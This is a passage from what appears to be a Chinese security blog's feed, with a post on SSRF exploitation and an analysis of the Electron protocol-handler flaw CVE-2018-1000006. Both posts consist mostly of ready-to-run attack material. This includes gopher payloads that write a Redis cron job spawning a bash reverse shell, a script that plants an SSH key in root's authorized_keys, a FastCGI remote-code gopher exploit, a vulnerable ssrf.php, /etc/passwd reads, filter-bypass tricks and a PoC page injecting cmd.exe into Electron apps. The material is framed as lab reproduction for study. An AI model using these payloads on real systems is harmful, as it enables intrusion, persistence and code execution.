zlib/1.2.8 libidn2/2.0.2 libpsl/0.18.0 (+libidn2/2.0.2) libssh2/1.8.0 nghttp2/1.25.0 librtmp/2.3Release-Date: 2017-08-14Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP HTTP2 UnixSockets HTTPS-proxy PSL </code></pre><h4 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h4><pre><code># 利用file协议查看文件curl -v &apos;file:///etc/passwd&apos;# 利用dict探测端口curl -v &apos;dict://127.0.0.1:22&apos;curl -v &apos;dict://127.0.0.1:6379/info&apos;# 利用gopher协议反弹shellcurl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</code></pre><h4 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h4><p>创建ssrf.php:</p><pre><code>&lt;?php $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]); #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_HEADER, 0); echo $url;curl_exec($ch); curl_close($ch); ?&gt;</code></pre><p>远程利用</p><pre><code># 利用file协议任意文件读取curl -v &apos;http:///192.168.75.130/ssrf.php?url=file:///etc/passwd&apos;# 利用dict协议查看端口curl -v &apos;http:///192.168.75.130/ssrf.php?url=dict://127.0.0.1:22&apos;# 利用gopher协议反弹shellcurl -v &apos;http://192.168.75.130/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</code></pre><h3 id="攻击内网应用"><a href="#攻击内网应用" class="headerlink" title="攻击内网应用"></a>攻击内网应用</h3><p>主要攻击redis、discuz、fastcgi、memcache、内网脆弱应用这几类应用，主要利用gopher协议。<br>Gopher协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。Gopher协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache也可以进行 GET、POST 请求。这极大拓宽了 SSRF 的攻击面。</p><h4 id="攻击redis"><a href="#攻击redis" class="headerlink" title="攻击redis"></a>攻击redis</h4><h4 id="redis反弹shell"><a href="#redis反弹shell" class="headerlink" title="redis反弹shell"></a>redis反弹shell</h4><p>redis_shell.sh:</p><pre><code>echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /var/spool/cron/redis-cli -h $1 -p $2 config set dbfilename rootredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>注意redis反弹shell有个坑，ubuntu不能使用bash反弹shell，如果如遇到ubuntu就该为写ssh key吧。<br>用socat抓数据包：</p><pre><code>socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</code></pre><p>执行脚本：</p><pre><code>bash redis_shell.sh 127.0.0.1 4444</code></pre><p>socat捕获到的数据：</p><pre><code>&gt; 2018/04/21 08:51:02.903058  length=85 from=0 to=84*3\r$3\rset\r$1\r1\r$58\r*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\r&lt; 2018/04/21 08:51:02.904598  length=5 from=0 to=4+OK\r&gt; 2018/04/21 08:51:02.913147  length=65 from=0 to=64*4\r$6\rconfig\r$3\rset\r$3\rdir\r$24\r/var/spool/cron/crontabs\r&lt; 2018/04/21 08:51:02.914291  length=5 from=0 to=4+OK\r&gt; 2018/04/21 08:51:02.929191  length=52 from=0 to=51*4\r$6\rconfig\r$3\rset\r$10\rdbfilename\r$4\rroot\r&lt; 2018/04/21 08:51:02.930264  length=5 from=0 to=4+OK\r&gt; 2018/04/21 08:51:02.936022  length=14 from=0 to=13*1\r$4\rsave\r&lt; 2018/04/21 08:51:02.939814  length=5 from=0 to=4+OK\r&gt; 2018/04/21 08:51:02.943303  length=14 from=0 to=13*1\r$4\rquit\r&lt; 2018/04/21 08:51:02.944066  length=5 from=0 to=4+OK\r</code></pre><p>将其保存为socat.log<br>然后将其转换为gopher适用的协议，这里用jaychou师傅写的一个脚本<br>转换规则如下：<br>如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。<br>如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。<br>将\r字符串替换成%0d%0a<br>空白行替换为%0a<br>tran2gopher.py：</p><pre><code>#coding: utf-8#author: JoyChouimport sysexp = &apos;&apos;with open(sys.argv[1]) as f:    for line in f.readlines():        if line[0] in &apos;&gt;&lt;+&apos;:            continue        # 判断倒数第2、3字符串是否为\r        elif line[-3:-1] == r&apos;\r&apos;:            # 如果该行只有\r，将\r替换成%0a%0d%0a            if len(line) == 3:                exp = exp + &apos;%0a%0d%0a&apos;            else:                line = line.replace(r&apos;\r&apos;, &apos;%0d%0a&apos;)                # 去掉最后的换行符                line = line.replace(&apos;\n&apos;, &apos;&apos;)                exp = exp + line        # 判断是否是空行，空行替换为%0a        elif line == &apos;\x0a&apos;:            exp = exp + &apos;%0a&apos;        else:            line = line.replace(&apos;\n&apos;, &apos;&apos;)            exp = exp + lineprint exppython tran2gopher.py socat.log</code></pre><p>结果为：</p><pre><code>*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$24%0d%0a/var/spool/cron/crontabs%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a</code></pre><p>本地测试是否成功：</p><pre><code>curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$24%0d%0a/var/spool/cron/crontabs%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a%0a&apos;</code></pre><p>如果返回5个ok则表示5个命令都执行成功</p><p>如果远程测试，则还应进行url编码：</p><pre><code>curl -v &apos;http://192.168.75.130/ssrf.php?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%36%33%37%39%2f%5f%2a%33%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%25%30%64%25%30%61%31%25%30%64%25%30%61%24%35%38%25%30%64%25%30%61%25%30%61%25%30%61%25%30%61%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%32%37%2e%30%2e%30%2e%31%2f%31%32%33%34%20%30%3e%26%31%25%30%61%25%30%61%25%30%61%25%30%61%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%33%25%30%64%25%30%61%64%69%72%25%30%64%25%30%61%24%32%34%25%30%64%25%30%61%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%2f%63%72%6f%6e%74%61%62%73%25%30%64%25%30%61%2a%34%25%30%64%25%30%61%24%36%25%30%64%25%30%61%63%6f%6e%66%69%67%25%30%64%25%30%61%24%33%25%30%64%25%30%61%73%65%74%25%30%64%25%30%61%24%31%30%25%30%64%25%30%61%64%62%66%69%6c%65%6e%61%6d%65%25%30%64%25%30%61%24%34%25%30%64%25%30%61%72%6f%6f%74%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%73%61%76%65%25%30%64%25%30%61%2a%31%25%30%64%25%30%61%24%34%25%30%64%25%30%61%71%75%69%74%25%30%64%25%30%61%25%30%61&apos;</code></pre><p>监听端口一分钟后，就会执行命令反弹shell</p><pre><code>nc -lvp 1234</code></pre><h4 id="写入ssh-key"><a href="#写入ssh-key" class="headerlink" title="写入ssh key"></a>写入ssh key</h4><p>先生成ssh key</p><pre><code>ssh-keygen -t rsa</code></pre><p>ssh_shell.sh</p><pre><code>echo -e &quot;\n\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNjOo6YRWDUNLdBDX3Y8lrEm6r9Ov9rFtYx5U/XSrSdUsRmGW9PvAlceS4H/5aExJc04bcTXQXRHO3RJQHcKvPUIcrxOION2mvccWkehmHnTTDCUw9igqFH91aMg013Ist6xKnco+Nn9LKJD49rtMKG+BFOTLg4C27gLC0OZkl8itZGHTS9S8I5LTEpwLItDkbZBgmDKYi/kaWjlw9PWtFYNpEvrt2SBgvWnHkVzPPELfTkbiIuwHYyYZD6YAXpH3tplk5RIZoHID08YzdxQqjcNdEXMFuaYvfdIWIWfzbhAwKl/lSpMDOBosAbd70CdjIz7VMcoYCcArr+zNtg8Hz root@ubuntu\n\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1redis-cli -h $1 -p $2 config set dir /root/.sshredis-cli -h $1 -p $2 config set dbfilename authorized_keysredis-cli -h $1 -p $2 saveredis-cli -h $1 -p $2 quit</code></pre><p>接下来过程和上面类似，不在重复。<br>在redis服务器上还有web服务知道路径的时候还可以直接写webshell。</p><h3 id="攻击fastcgi"><a href="#攻击fastcgi" class="headerlink" title="攻击fastcgi"></a>攻击fastcgi</h3><p>使用vulhun的<a href="https://github.com/vulhub/vulhub/tree/master/fpm" target="_blank" rel="noopener">fpm环境</a><br>libcurl版本&gt;=7.45.0<br>PHP-FPM监听端口<br>PHP-FPM版本 &gt;= 5.3.3<br>知道服务器上任意一个php文件的绝对路径<br>由于EXP里有%00，CURL版本小于7.45.0的版本，gopher的%00会被截断。</p><p><a href="https://curl.haxx.se/changes.html#7_45_0" target="_blank" rel="noopener">https://curl.haxx.se/changes.html#7_45_0</a><br>Fixed in 7.45.0 - October 7 2015<br>gopher: don’t send NUL byte</p><p>转换为Gopher的EXP<br>监听一个端口的流量 nc -lvp 2333 &gt; 1.txt，执行EXP，流量打到2333端口</p><p>python fpm.py -c “<?php system('echo sectest > /tmp/1.php'); exit;?>“ -p 2333 127.0.0.1 /usr/local/lib/php/PEAR.php</p><p>urlencode</p><pre><code>f = open(&apos;1.txt&apos;)ff = f.read()from urllib import quoteprint quote(ff)</code></pre><p>得到gopher的EXP</p><pre><code>%01%01%B2%93%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B2%93%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04%B2%93%00%00%00%00%01%05%B2%93%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%B2%93%00%00%00%00</code></pre><p>执行：</p><pre><code>curl &apos;gopher://127.0.0.1:9000/_%01%01%B2%93%00%08%00%00%00%01%00%00%00%00%00%00%01%04%B2%93%01%E7%00%00%0E%02CONTENT_LENGTH50%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04%B2%93%00%00%00%00%01%05%B2%93%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%B2%93%00%00%00%00&apos;</code></pre><p>成功后可发现生成了服务器上生成了/tmp/1.php文件</p><h3 id="SSRF漏洞出现的场景"><a href="#SSRF漏洞出现的场景" class="headerlink" title="SSRF漏洞出现的场景"></a>SSRF漏洞出现的场景</h3><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2899359012.jpg" alt="SSRF脑图.jpg"></p><ul><li>能够对外发起网络请求的地方，就可能存在SSRF漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）<br>例子</li><li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li><li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li><li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li><li>邮件系统就是接收邮件服务器地址这些地方。</li><li>文件就找ImageMagick，xml这些。</li><li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li></ul><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul><li>限制协议为HTTP、HTTPS</li><li>禁止30x跳转</li><li>设置URL白名单或者限制内网IP</li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p><a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a> 被过滤的时候，可以尝试一下几种方式：</p><p>1、@或#</p><p><a href="http://abc@127.0.0.1" target="_blank" rel="noopener">http://abc@127.0.0.1</a></p><p>127.0.0.1#<a href="http://abc" target="_blank" rel="noopener">http://abc</a><br>2、添加端口号<br><a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>3、短地址<br><a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><p>4、可以指向任意ip的域名：xip.io</p><p>10.0.0.1.xip.io 10.0.0.1<br><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a> 10.0.0.1<br>mysite.10.0.0.1.xip.io 10.0.0.1<br>foo.bar.10.0.0.1.xip.io 10.0.0.1<br>5、ip地址转换成进制来访问<br>115.239.210.26 ＝ 16373751032<br>首先把这四段数字给 转成 16 进制！结果：73 ef d2 1a 然后把 73efd21a 这十六进制一起转换成8进制！访问使用<a href="http://00+转换后" target="_blank" rel="noopener">http://00+转换后</a></p><p>十六进制<br>115.239.210.26 = 0x73.0xef.0xd2.0x1a</p><p>八进制<br>115.239.210.26 = 0163.0357.0322.0032<br>6.DNS rebinding</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="https://joychou.org/web/phpssrf.html#directory094317035400064296" target="_blank" rel="noopener">SSRF in PHP</a><br>2.<a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/" target="_blank" rel="noopener">SSRF 服务端请求伪造</a><br>3.<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用Gopher协议拓展攻击面</a><br>4.<a href="https://evi1cg.me/archives/SSRF_Bypass.html" target="_blank" rel="noopener">SSRF中的绕过姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h3&gt;&lt;p&gt;SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的
      
    
    </summary>
    
    
      <category term="web-security" scheme="http://zerokeeper.github.io/categories/web-security/"/>
    
    
      <category term="ssrf" scheme="http://zerokeeper.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>Electron远程命令执行漏洞(CVE-2018-1000006)</title>
    <link href="http://zerokeeper.github.io/vul-analysis/electron-remote-command-execution-vulnerability-cve20181000006.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/electron-remote-command-execution-vulnerability-cve20181000006.html</id>
    <published>2018-04-21T23:39:00.000Z</published>
    <updated>2019-10-20T15:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Electron是基于Chromium 和Node.js，并使用HTML、JS、CSS来构建应用的框架。项目地址：<a href="https://github.com/electron/electron" target="_blank" rel="noopener">https://github.com/electron/electron</a> 。Electron应用广泛，像Slack、Skype、网易云音乐、Atom、GitHub 客户端、VS Code均采用该框架开发。在1月22日，官方发布了一个远程命令执行漏洞<a href="https://electronjs.org/blog/protocol-handler-fix" target="_blank" rel="noopener">CVE-2018-1000006</a> 的通过，基于存在漏洞的版本进行开发的应用均存在被攻击的风险，攻击者可以远程在用户机器上执行任意命令。影响范围：Electron &lt; 1.8.2-beta.4、1.7.11、1.6.16 的版本。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>electron可通过app注册自定义的伪协议，攻击者可以利用这些伪协议，构造恶意的url通过浏览器解析和传递给存在漏洞的electron应用程序，从而在启动程序时执行传入的命令。该漏洞影响windows平台。<br>分析源代码，该漏洞存在于<a href="https://github.com/electron/electron/blob/b9c0bab8f1e8c40427db3d48da3d51481f6603c2/atom/browser/browser_win.cc#L212" target="_blank" rel="noopener">atom\browser\browser_win.cc的第212行</a>SetAsDefaultProtocolClient()函数中</p><pre><code>bool Browser::SetAsDefaultProtocolClient(const std::string&amp; protocol,                                        mate::Arguments* args) {  // HKEY_CLASSES_ROOT  //    $PROTOCOL  //       (Default) = &quot;URL:$NAME&quot;  //       URL Protocol = &quot;&quot;  //       shell  //          open  //             command  //                (Default) = &quot;$COMMAND&quot; &quot;%1&quot;  //  // However, the &quot;HKEY_CLASSES_ROOT&quot; key can only be written by the  // Administrator user. So, we instead write to &quot;HKEY_CURRENT_USER\  // Software\Classes&quot;, which is inherited by &quot;HKEY_CLASSES_ROOT&quot;  // anyway, and can be written by unprivileged users.  if (protocol.empty())    return false;  base::string16 exe;  if (!GetProtocolLaunchPath(args, &amp;exe))    return false;  // Main Registry Key  HKEY root = HKEY_CURRENT_USER;  base::string16 keyPath = base::UTF8ToUTF16(&quot;Software\\Classes\\&quot; + protocol);  base::string16 urlDecl = base::UTF8ToUTF16(&quot;URL:&quot; + protocol);  // Command Key  base::string16 cmdPath = keyPath + L&quot;\\shell\\open\\command&quot;;  // Write information to registry  base::win::RegKey key(root, keyPath.c_str(), KEY_ALL_ACCESS);  if (FAILED(key.WriteValue(L&quot;URL Protocol&quot;, L&quot;&quot;)) ||      FAILED(key.WriteValue(L&quot;&quot;, urlDecl.c_str())))    return false;  base::win::RegKey commandKey(root, cmdPath.c_str(), KEY_ALL_ACCESS);  if (FAILED(commandKey.WriteValue(L&quot;&quot;, exe.c_str())))    return false;  return true;}</code></pre><p>SetAsDefaultProtocolClient函数在注册表中注册自定义的伪协议，注册后查看其注册表<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2402034202.png" alt="electron-remote-command-execution-vulnerability-1.png"></p><pre><code>&quot;C:\Users\Lee\Desktop\electron-v1.7.10-win32-x64\electron.exe&quot; &quot;%1&quot;</code></pre><p>这次远程命令注入的漏洞仅限于Windows平台，是因为与Win32应用注册url scheme和调用的机制有关<a href="https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/aa767914(v=vs.85)" target="_blank" rel="noopener">Registering an Application to a URI Scheme</a></p><pre><code>When ShellExecute executes the pluggable protocol handler with a stringon the command line, any non-encoded spaces, quotes, and backslashes in the URI will be interpreted as part of the command line. This means that if you use C/C++&apos;s argc and argv to determine the arguments passed to your application, the string may be broken across multiple parameters.</code></pre><p>%1占位符相当于argv，将URL的参数传递给应用程序。通过构成payload，传入执行命令的paylaod，闭合双引号，造成命令执行。</p><pre><code>&quot;C:\Users\Lee\Desktop\electron-v1.7.10-win32-x64\electron.exe&quot; &quot;zerokeeper:///?&quot; &quot;--no-sandbox&quot; &quot;--renderer-cmd-prefix=cmd.exe /c start calc&quot;</code></pre><h3 id="漏洞证明"><a href="#漏洞证明" class="headerlink" title="漏洞证明"></a>漏洞证明</h3><p>下载<a href="https://github-production-release-asset-2e65be.s3.amazonaws.com/9384267/67e04c0a-e402-11e7-91e2-21c2cddf6a07?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20180420%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20180420T080429Z&X-Amz-Expires=300&X-Amz-Signature=09d9eff649c7200985bf550388d6390b795f2971d4c22d07ca2d8e8aac52e62a&X-Amz-SignedHeaders=host&actor_id=18204909&response-content-disposition=attachment%3B%20filename%3Delectron-v1.7.10-win32-x64.zip&response-content-type=application%2Foctet-stream" target="_blank" rel="noopener">electron-v1.7.10-win32-x64.zip</a>搭建本地复现环境，写一个app，用了注册自己的协议。这里直接用chybeta师傅的写的Demo，新建一个文件夹app，里面新建三个文件main.js，index.html，package.json：<br>main.js：</p><pre><code>const {app, BrowserWindow} = require(&apos;electron&apos;)const path = require(&apos;path&apos;)const url = require(&apos;url&apos;)const dialog = require(&apos;electron&apos;).dialoglet winfunction createWindow () {  win = new BrowserWindow({width: 800, height: 600})  win.loadURL(url.format({    pathname: path.join(__dirname, &apos;index.html&apos;),    protocol: &apos;file:&apos;,    slashes: true  }))  win.on(&apos;closed&apos;, function(){    win = null  })}app.on(&apos;ready&apos;, createWindow)app.on(&apos;window-all-closed&apos;, () =&gt; {  if (process.platform !== &apos;darwin&apos;) {    app.quit()  }})app.on(&apos;activate&apos;, function(){  if (win === null) {    createWindow()  }})app.setAsDefaultProtocolClient(&apos;zerokeeper&apos;)</code></pre><p>index.html:</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;title&gt;Hello World!&lt;/title&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;h1&gt;Hello World!&lt;/h1&gt;    This is a demo for CVE-2018-1000006&lt;/br&gt;    Electron version:&lt;script&gt;document.write(process.versions[&apos;electron&apos;])&lt;/script&gt;.  &lt;/body&gt;&lt;/html&gt;</code></pre><p>package.json:</p><pre><code>{  &quot;name&quot;    : &quot;CVE-2018-1000006 Demo&quot;,  &quot;version&quot; : &quot;0.0.1&quot;,  &quot;main&quot;    : &quot;main.js&quot;}</code></pre><p>然后把app移到resources目录下，启动electron.exe可以发现已经注册了自己的伪协议，<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2402034202.png" alt="electron-remote-command-execution-vulnerability-1.png"></p><p>然后构造poc.html：</p><pre><code>&lt;html&gt;&lt;head&gt;    &lt;title&gt;POC for CVE-2018-1000006&lt;/title&gt;&lt;/head&gt;&lt;body&gt;  &lt;a class=&quot;protocol&quot; href=&apos;zerokeeper://?&quot; &quot;--no-sandbox&quot; &quot;--renderer-cmd-prefix=cmd.exe /c start calc&apos;&gt;&lt;h3&gt;electron custom click me&lt;/h3&gt;&lt;/a&gt;  &lt;a class=&quot;protocol&quot; href=&apos;cloudmusic.mp3://?&quot; &quot;--no-sandbox&quot; &quot;--gpu-launcher=cmd.exe /c start calc&apos;&gt;&lt;h3&gt;cloudmusic click me&lt;/h3&gt;&lt;/a&gt;  &lt;a class=&quot;protocol&quot; href=&apos;vscode://?&quot; &quot;--no-sandbox&quot; &quot;--gpu-launcher=cmd.exe /c start calc&apos;&gt;&lt;h3&gt;vscode click me&lt;/h3&gt;&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;  </code></pre><p>其中我还构造了其它两个使用了electron开放的应用，vscode和网易云音乐的payload。最后用浏览器打开验证(ps:这里我使用的ie，不知道为什么chrome和firefox不行)。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/4122085361.png" alt="electron-remote-command-execution-vulnerability-2.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/3888861787.png" alt="electron-remote-command-execution-vulnerability-3.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/3826448808.png" alt="electron-remote-command-execution-vulnerability-4.png"></p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2018/04/2389860766.png" alt="electron-remote-command-execution-vulnerability-5.png"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.官方建议，将可控参数放在–之后。</p><pre><code>app.setAsDefaultProtocolClient(protocol, process.execPath, [  &apos;--your-switches-here&apos;,  &apos;--&apos;])</code></pre><p>2.或者升级到1.8.2-beta.4、1.7.11、1.6.16 版本</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>1.<a href="https://xz.aliyun.com/t/1990" target="_blank" rel="noopener">Electron &lt; v1.8.2-beta.4 远程命令执行漏洞</a><br>2.<a href="https://paper.seebug.org/515/" target="_blank" rel="noopener">Electron 自定义协议命令注入（CVE-2018-1000006）分析和 Url Scheme 安全考古</a><br>3.<a href="http://science.china.com.cn/2018-02/06/content_40217945.htm" target="_blank" rel="noopener">Electron远程执行漏洞技术简述</a><br>4.<a href="https://zhuanlan.zhihu.com/p/33262222" target="_blank" rel="noopener">CVE-2018-1000006：Electron远程代码执行漏洞复现与初步分析</a><br>5.<a href="https://electronjs.org/blog/protocol-handler-fix" target="_blank" rel="noopener">Protocol Handler Vulnerability Fix</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Electron是基于Chromium 和Node.js，并使用HTML、JS、CSS来构建应用的框架。项目地址：&lt;a href=&quot;http
      
    
    </summary>
    
    
      <category term="vul-analysis" scheme="http://zerokeeper.github.io/categories/vul-analysis/"/>
    
    
      <category term="命令执行" scheme="http://zerokeeper.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="electron" scheme="http://zerokeeper.github.io/tags/electron/"/>
    
      <category term="cve-2018-1000006" scheme="http://zerokeeper.github.io/tags/cve-2018-1000006/"/>
    
  </entry>
  
  <entry>
    <title>struts2 s2-052漏洞分析</title>
    <link href="http://zerokeeper.github.io/vul-analysis/analysis-of-struts2-s2052-vulnerability.html"/>
    <id>http://zerokeeper.github.io/vul-analysis/analysis-of-struts2-s2052-vulnerability.html</id>
